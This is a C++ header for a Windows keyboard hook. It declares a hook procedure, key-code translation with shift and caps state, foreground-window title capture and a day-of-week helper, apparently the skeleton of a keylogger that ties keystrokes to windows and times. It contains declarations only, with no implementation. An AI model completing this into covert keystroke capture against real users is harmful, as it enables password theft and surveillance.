#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <Windows.h>
#include <string>
#include <sstream>
#include <iostream>

extern HHOOK KeyboardHook;
extern bool shift;
extern char cWindow[1000];
extern HWND lastWindow;

std::string GetWindowStringText(HWND hwnd);
std::string GetForegroundWindowTitle();

void unhookKeyboard();
std::string HookCode(DWORD code, BOOL caps, BOOL shift);
std::string Dayofweek(int code);
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);

#endif